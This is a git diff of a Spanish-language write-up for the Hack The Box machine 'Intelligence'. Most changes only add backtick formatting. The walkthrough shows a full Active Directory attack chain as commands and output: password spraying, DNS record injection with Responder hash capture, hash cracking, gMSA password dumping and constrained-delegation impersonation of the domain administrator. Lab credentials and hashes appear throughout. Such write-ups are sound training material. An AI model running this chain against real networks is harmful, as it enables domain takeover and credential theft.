@@ -41,13 +41,13 @@ image:
   
 ## Descripción
 
-Intelligence es una máquina de Windows de dificultad media que muestra una serie de ataques comunes en un entorno de Active Directory. Después de recuperar documentos PDF internos almacenados en el servidor web (forzando un esquema de nombres común) e inspeccionar su contenido y metadatos, que revelan una `contraseña por defecto y una lista de posibles usuarios de AD`, el password spraying conduce al descubrimiento de una cuenta válida, otorgando un foothold inicial en el sistema. Se descubre un script de PowerShell programado que envía solicitudes autenticadas a servidores web según su nombre de host; al agregar un registro DNS personalizado, es posible forzar una solicitud que puede ser interceptada para capturar el hash de un segundo usuario, que es fácilmente crackeable. Este usuario puede leer la `contraseña de una cuenta de servicio gestionada` por un grupo, que a su vez tiene acceso de `delegación restringida al controlador de dominio`, resultando en un shell con privilegios administrativos
+`Intelligence` es una máquina de `Windows` de dificultad `media` que muestra una serie de ataques comunes en un entorno de `Active Directory`. Después de recuperar documentos `PDF` internos almacenados en el servidor web (`forzando un esquema de nombres común`) e inspeccionar su contenido y metadatos, que revelan una `contraseña` por defecto y una lista de posibles `usuarios de AD`, el `password spraying` conduce al descubrimiento de una `cuenta` válida, otorgando un `foothold` inicial en el sistema. Se descubre un `script de PowerShell` programado que envía solicitudes autenticadas a servidores web según su `nombre de host`; al agregar un `registro DNS` personalizado, es posible forzar una solicitud que puede ser interceptada para capturar el `hash` de un segundo usuario, que es fácilmente `crackeable`. Este usuario puede leer la `contraseña` de una `cuenta de servicio gestionada` por un grupo, que a su vez tiene acceso de `delegación restringida` al `controlador de dominio`, resultando en un `shell` con `privilegios administrativos`
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está activa y se determina su sistema operativo, el ttl de las máquinas windows suele ser 128, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.95.154              
@@ -63,7 +63,7 @@ rtt min/avg/max/mdev = 36.845/37.538/38.541/0.725 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.95.154 -oG openPorts 
@@ -118,7 +118,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
            Raw packets sent: 131067 (5.767MB) | Rcvd: 36 (1.704KB)
 ```
 
-Se procede a realizar un análisis de `detección de servicios y la identificación de versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49691,49692,49710,49713 10.129.95.154 10.129.95.154 -oN services
@@ -248,14 +248,14 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 189.83 seconds
 
 ### SMB Enumeration
 
-Obtenemos el `nombre de la máquina y el dominio`
+Obtenemos el `nombre de la máquina` y el `dominio`
 
 ```
 # netexec smb 10.129.95.154
 SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 ```
 
-Añadimos el dominio al `/etc/hosts`
+Añadimos el `dominio` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -274,11 +274,11 @@ Al acceder a `http://10.129.95.154/` vemos esta página web
 
 ![](/assets/img/Intelligence/image_1.png)
 
-Si nos dirigimos a la parte inferior nos podemos descargar dos documentos PDF
+Si nos dirigimos a la parte inferior nos podemos descargar `dos documentos PDF`
 
 ![](/assets/img/Intelligence/image_2.png)
 
-Si examinamos esos documentos PDF obtenemos los nombres de los usuarios `Jose.Williams y William.Lee`
+Si examinamos esos documentos `PDF` obtenemos los nombres de los usuarios `Jose.Williams` y `William.Lee`
 
 ```
 # exiftool 2020-12-15-upload.pdf 
@@ -316,7 +316,7 @@ Page Count                      : 1
 Creator                         : William.Lee
 ```
 
-Me he creado este `pequeño script en Python para crearme un diccionario personalizado`
+Me he creado este `pequeño script` en `Python` para crearme un `diccionario personalizado`
 
 ```
 from datetime import timedelta, date
@@ -336,7 +336,7 @@ file.close()
 
 ```
 
-He fuzzeado en busca de nuevas rutas
+He `fuzzeado` en busca de `nuevas rutas`
 
 ```
 # wfuzz -c -t 100 -w list_pdf.txt --hc 404 http://intelligence.htb/documents/FUZZ   
@@ -452,13 +452,13 @@ ID           Response   Lines    Word       Chars       Payload
 000001836:   200        204 L    1130 W     25159 Ch    "2020-01-10-upload.pdf"
 ```
 
-Nos creamos un nuevo diccionario con todos estos nombres de documentos PDF y los descargamos
+Nos creamos un `nuevo diccionario` con todos estos `nombres de documentos PDF` y los `descargamos`
 
 ```
 # while IFS= read -r line; do wget "http://10.129.95.154/documents/$line"; done < pdf_list.txt
 ```
 
-Me he descargado todos los PDFs y he obtenido varios nombres de usuario en los metadatos de los archivos, los cuales vamos a almacenar en un fichero llamado users
+Me he descargado todos los `PDFs` y he obtenido varios `nombres de usuario` en los `metadatos` de los archivos, los cuales vamos a almacenar en un fichero llamado `users`
 
 ```
 # exiftool * | grep Creator | sort -u             
@@ -494,13 +494,13 @@ Creator                         : Veronica.Patel
 Creator                         : William.Lee
 ```
 
-Usando pdf2text podemos leer todo el texto de los PDFs y almacenarlos en un archivo
+Usando `pdf2text` podemos leer todo el `texto` de los `PDFs` y almacenarlos en un `archivo`
 
 ```
 # pdf2txt * --outfile filtered_pdfs.txt
 ```
 
-Si abrimos el archivo y filtramos por la palabra pass, vemos una `contraseña`
+Si abrimos el `archivo` y filtramos por la palabra `pass`, vemos una `contraseña`
 
 ```
 ^LNew Account Guide
@@ -514,7 +514,7 @@ After logging in please change your password as soon as possible.
 
 ## Abusing Smb
 
-Validamos las credenciales obtenidas `Tiffany.Molina:NewIntelligenceCorpUser9876`
+`Validamos` las `credenciales` obtenidas `Tiffany.Molina:NewIntelligenceCorpUser9876`
 
 ```
 # netexec smb 10.129.95.154 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
@@ -551,7 +551,7 @@ SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronic
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 ```
 
-Listamos recursos compartidos por SMB
+Listamos `recursos compartidos` por `SMB`
 
 ```
 # netexec smb 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
@@ -569,7 +569,7 @@ SMB         10.129.95.154   445    DC               SYSVOL          READ        
 SMB         10.129.95.154   445    DC               Users           READ            
 ```
 
-Nos descargamos el archivo
+Nos `descargamos` el `archivo`
 
 ```
 # smbclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' //10.129.95.154/IT
@@ -585,7 +585,7 @@ getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (5.7 KiloBytes/s
 smb: \> exit
 ```
 
-Leemos el contenido del archivo, lo que está haciendo el script es autenticarse contra un DNS record que tenga en su nombre la palabra web al principio
+Leemos el `contenido del archivo`, lo que está haciendo el `script` es autenticarse contra un `DNS record` que tenga en su nombre la palabra `web` al principio
 
 ```
 # cat downdetector.ps1 
@@ -603,7 +603,7 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 
 ## Abusing DNS
 
-Si inyectamos un DNS record que apunte hacia nuestra IP, podemos capturar las credenciales que se envían. Para ello, lo primero es clonarnos este repositorio [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) y posteriormente inyectar un DNS record que apunte a nuestro equipo
+Si inyectamos un `DNS record` que apunte hacia nuestra `IP`, podemos capturar las `credenciales` que se envían. Para ello, lo primero es clonarnos este `repositorio` [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) y posteriormente inyectar un `DNS record` que apunte a nuestro `equipo`
 
 ```
 # python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -t A -r web-pwned -d 10.10.16.17 10.129.95.154    
@@ -614,7 +614,7 @@ Si inyectamos un DNS record que apunte hacia nuestra IP, podemos capturar las cr
 [+] LDAP operation completed successfully
 ```
 
-Nos ponemos en escucha con el responder y obtenemos el hash NTLMV2 del usuario `Ted.Graves`
+Nos ponemos en `escucha` con el `responder` y obtenemos el `hash NTLMV2` del usuario `Ted.Graves`
 
 ```
 # sudo responder -I tun0
@@ -693,7 +693,7 @@ Nos ponemos en escucha con el responder y obtenemos el hash NTLMV2 del usuario `
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3b8c82dfd86e7739:2D03CFBE3D6B5CF59ABD96584DDFBB5F:0101000000000000B5D60C28C804DB01CEEBC0A61293423D00000000020008004700540049005A0001001E00570049004E002D004E003700360045005A004A0049004400310047004100040014004700540049005A002E004C004F00430041004C0003003400570049004E002D004E003700360045005A004A00490044003100470041002E004700540049005A002E004C004F00430041004C00050014004700540049005A002E004C004F00430041004C00080030003000000000000000000000000020000073987153E985A7A5315E3E13B8BED9342F203B285AA53562C4146EA07ED8D2780A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D00700077006E00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 ```
 
-Rompemos el hash NTLMV2 obteniendo la `contraseña`
+Rompemos el `hash NTLMV2` obteniendo la `contraseña`
 
 ```
 # john -w:/usr/share/wordlists/rockyou.txt hash
@@ -709,39 +709,39 @@ Session completed.
 
 ## Privilege Escalation
 
-Como no tenemos acceso a la `máquina víctima`, vamos a usar `bloodhound-python`. Si nos da problemas, podemos eliminar la opción del archivo ZIP e importar todos los JSON
+Como no tenemos acceso a la `máquina víctima`, vamos a usar `bloodhound-python`. Si nos da problemas, podemos eliminar la opción del `archivo ZIP` e importar todos los `JSON`
 
 ```
 # bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.129.184.126 -d intelligence.htb -v --zip 
 ```
 
-Ejecutamos neo4j para proceder a una `enumeración` más profunda del directorio activo
+Ejecutamos `neo4j` para proceder a una `enumeración` más `profunda` del `directorio activo`
 
 ```
 # sudo neo4j console
 ```
 
-Nos dirigimos a `http://localhost:7474 y rellenamos los datos con las credenciales neo4j:neo4j`
+Nos dirigimos a `http://localhost:7474` y `rellenamos` los `datos` con las credenciales `neo4j:neo4j`
 
 ![](/assets/img/Intelligence/image_3.png)
 
-Introducimos una `contraseña`
+`Introducimos` una `contraseña`
 
 ![](/assets/img/Intelligence/image_4.png)
 
-Nos abrimos el bloodhound y nos logueamos
+Nos `abrimos` el `bloodhound` y nos `logueamos`
 
 ![](/assets/img/Intelligence/image_5.png)
 
-Pinchamos en Upload Data y subimos el archivo .zip
+Pinchamos en `Upload Data` y subimos el archivo .zip
 
 ![](/assets/img/Intelligence/image_6.png)
 
-Si todo ha funcionado correctamente debería de verse así
+Si todo ha funcionado `correctamente` debería de verse así
 
 ![](/assets/img/Intelligence/image_7.png)
 
-Pinchamos en Find Shortest Paths to Domain Admins
+Pinchamos en `Find Shortest Paths to Domain Admins`
 
 ![](/assets/img/Intelligence/image_8.png)
 
@@ -749,11 +749,11 @@ Vemos que existe una forma de convertirnos en el usuario `svc_int$`
 
 ![](/assets/img/Intelligence/image_9.png)
 
-Podemos leer la contraseña del Group Managed Service Account
+Podemos leer la contraseña del `Group Managed Service Account`
 
 ![](/assets/img/Intelligence/image_10.png)
 
-Lo primero que debemos hacer es clonarnos el repositorio [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper) y ejecutar el siguiente comando para dumpear la `contraseña`
+Lo primero que debemos hacer es clonarnos el `repositorio` [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper) y ejecutar el siguiente `comando` para `dumpear` la `contraseña`
 
 ```
 # python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
@@ -765,15 +765,15 @@ svc_int$:aes256-cts-hmac-sha1-96:aa7dad03df7672cf9c6fb9abafd90b0aa47a00dcf7e61ab
 svc_int$:aes128-cts-hmac-sha1-96:c28e946a25e1dcb0d6552399baf0cbbe
 ```
 
-Ahora que tenemos el hash NT del usuario `svc_int$`, podemos ganar acceso al domain controller como el usuario Administrator abusando del AllowedToDelegate
+Ahora que tenemos el `hash NT` del usuario `svc_int$`, podemos ganar acceso al `domain controller` como el usuario `Administrator` abusando del `AllowedToDelegate`
 
 ![](/assets/img/Intelligence/image_11.png)
 
-Vamos a ejecutar un Constrained Delegation Attack para ganar acceso como el usuario root
+Vamos a ejecutar un `Constrained Delegation Attack` para ganar acceso como el usuario `root`
 
 ![](/assets/img/Intelligence/image_12.png)
 
-El ataque lo tenemos que realizar sobre un SPN. Debido a que no sabemos cuáles existen en la `máquina víctima`, los obtenemos usando pywerview. En este caso, para el usuario `svc_int`, el SPN es `WWW/dc.intelligence.htb`
+El ataque lo tenemos que realizar sobre un `SPN`. Debido a que no sabemos cuáles existen en la `máquina víctima`, los obtenemos usando `pywerview`. En este caso, para el usuario `svc_int`, el `SPN` es `WWW/dc.intelligence.htb`
 
 ```
 # pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.129.184.126 --full-data
@@ -877,7 +877,7 @@ Al ejecutar el ataque nos puede dar el error `Kerberos SessionError: KRB_AP_ERR_
 # rdate -n http://10.129.184.126/
 ```
 
-Ejecutamos el comando nuevamente y funciona correctamente
+Ejecutamos el `comando` nuevamente y funciona `correctamente`
 
 ```
 # impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator' -altservice 'cifs' -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4   "intelligence.htb"/"svc_int$" 
@@ -892,13 +892,13 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Saving ticket in administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 
-Necesitamos `añadir esta variable de entorno`
+Necesitamos `añadir` esta `variable` de `entorno`
 
 ```
-# export KRB5CCNAME=pwd/administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+# export KRB5CCNAME=`pwd`/administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 
-A continuación ejecutamos el comando klist, si no lo tenemos instalado podemos hacer `sudo apt install krb5-user`
+A continuación `ejecutamos` el comando `klist`, si no lo tenemos instalado podemos hacer `sudo apt install krb5-user`
 
 ```
 # klist
@@ -910,7 +910,7 @@ Valid starting     Expires            Service principal
 	renew until 09/13/24 07:30:18
 ```
 
-Nos conectamos usando wmiexec
+Nos `conectamos` usando `wmiexec`
 
 ```
 # impacket-wmiexec -k dc.intelligence.htb 
